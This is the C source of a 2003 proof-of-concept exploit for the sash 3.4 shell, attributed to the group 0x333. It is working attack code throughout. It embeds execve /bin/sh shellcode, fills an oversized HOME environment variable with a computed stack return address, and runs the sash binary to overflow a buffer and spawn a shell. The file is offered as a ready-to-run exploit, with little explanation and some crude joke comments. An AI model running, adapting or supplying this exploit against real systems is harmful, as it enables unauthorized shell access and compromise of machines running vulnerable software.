/* 0x333monchan => sash 3.4 PoC exploit
 *
 * 26/10/2003
 *
 *  Monchan ... it's only ass ...
 *
 *  coded by c0wboy
 *
 *  (c) 0x333 Outsiders Security Labs / www.0x333.org
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BIN       "./sash"
#define SIZE      1060

unsigned char shellcode[] =
         "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
         "\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

int main (int argc, char ** argv)
{
    int i, ret, mode;
    char out[SIZE];

    char *sex[0x3] = { out, shellcode, 0x0 };

    int *monchan = (int *)(out + 0x1);

    fprintf (stdout, "\n --    sash 3.4 PoC exploit (2) by c0wboy    ---\n\n");

    ret = 0xc0000000 - strlen(shellcode) - strlen(BIN) - 0x6;
    for (i=0; i<SIZE-1 ; i+=4, *monchan++ = ret);

    fprintf (stdout, " <0x333> Monchan says : \"type CTRL-D to get a shell  !!!\"\n\n");

    memcpy ((char *)out, "HOME=", 5);
    execle (BIN, BIN, 0x0, sex, 0x0);
}


